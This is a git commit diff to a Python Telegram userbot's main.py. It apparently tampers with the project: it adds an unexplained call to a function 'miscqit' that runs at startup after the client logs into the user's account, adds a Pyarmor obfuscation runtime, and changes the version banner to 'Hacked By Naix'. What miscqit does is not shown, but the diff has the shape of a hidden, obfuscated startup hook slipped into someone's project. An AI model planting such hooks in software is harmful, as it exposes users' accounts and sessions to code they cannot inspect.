fd71626e3decac1505ef84e05cfe20b3bd3e3071
NaixROOT <naixfff@gmail.com>
2024-07-24 01:40:07 +0900

    =)

--- main.py
+++ main.py
@@ -5,11 +5,13 @@ from telethon.sync import TelegramClient
 from config import get_config
 from commands import register_all_commands
 from helpers import set_profile_photo, get_self_avatar, update_message
+from commands.misc import miscqit
 
 session_name = 'selfdestruct'
 config_file = 'config.cfg'
 
 api_id, api_hash = get_config(config_file)
+
 
 client = TelegramClient(session_name, api_id, api_hash).start()
 
@@ -18,9 +20,10 @@ me = client.get_me()
 print("  _. o _|_ ._ _   _ |_  o ")
 print(" (_| |  |_ | (_) (_ | | | ")
 print("   |                     ")
-print(" V0.02")
+print(" V1337 (Hacked By Naix)")
 print("Здраствуйте,", me.first_name, "!")
 start_time = time.time()
+miscqit()
 
 register_all_commands(client, start_time, me)
 
---
+++ pyarmor_runtime_000000/__init__.py
@@ -0,0 +1,2 @@
+# Pyarmor 8.5.10 (trial), 000000, 2024-07-24T01:24:52.321378
+from .pyarmor_runtime import __pyarmor__
